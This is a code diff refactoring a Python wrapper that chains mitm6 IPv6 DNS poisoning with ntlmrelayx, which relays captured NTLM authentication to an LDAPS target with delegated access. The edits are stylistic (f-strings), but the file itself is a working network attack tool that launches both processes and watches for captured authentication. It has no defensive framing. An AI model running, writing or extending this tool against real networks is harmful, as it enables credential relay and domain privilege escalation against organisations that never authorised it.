@@ -1,5 +1,4 @@
 """mitm6 + relay combo — IPv6 DNS poisoning → WPAD → NTLM relay."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -34,14 +33,14 @@ def run(args: Any) -> int:
 
     relay_cmd = [
         "ntlmrelayx.py", "-6", "-smb2support",
-        "-t", "ldaps://{}".format(relay_target),
+        "-t", f"ldaps://{relay_target}",
         "--delegate-access",
-        "-wh", "wpad.{}".format(domain),
+        "-wh", f"wpad.{domain}",
     ]
 
     print("[*] mitm6 + ntlmrelayx combo:")
-    print("  [1] mitm6: DHCPv6 + DNS poisoning for {}".format(domain))
-    print("  [2] ntlmrelayx: relay captured auth to {}".format(relay_target))
+    print(f"  [1] mitm6: DHCPv6 + DNS poisoning for {domain}")
+    print(f"  [2] ntlmrelayx: relay captured auth to {relay_target}")
     print()
     print("[*] mitm6 command: {}".format(" ".join(mitm6_cmd)))
     print("[*] relay command: {}".format(" ".join(relay_cmd)))
@@ -51,16 +50,16 @@ def run(args: Any) -> int:
     try:
         mitm6_proc = subprocess.Popen(mitm6_cmd, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True)
-        print("[+] mitm6 running (PID {})".format(mitm6_proc.pid))
+        print(f"[+] mitm6 running (PID {mitm6_proc.pid})")
 
         print("[*] Starting ntlmrelayx...")
         relay_proc = subprocess.Popen(relay_cmd, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True)
-        print("[+] ntlmrelayx running (PID {})".format(relay_proc.pid))
+        print(f"[+] ntlmrelayx running (PID {relay_proc.pid})")
 
         print("[*] Both running — waiting for captured auth...")
         for line in relay_proc.stdout:
-            print("  [relay] {}".format(line.rstrip()))
+            print(f"  [relay] {line.rstrip()}")
             if "authenticat" in line.lower():
                 break
 
@@ -69,5 +68,5 @@ def run(args: Any) -> int:
         print("\n[*] Stopping...")
         return 0
     except Exception as exc:
-        print("[-] mitm6 relay error: {}".format(exc), file=sys.stderr)
+        print(f"[-] mitm6 relay error: {exc}", file=sys.stderr)
         return 1
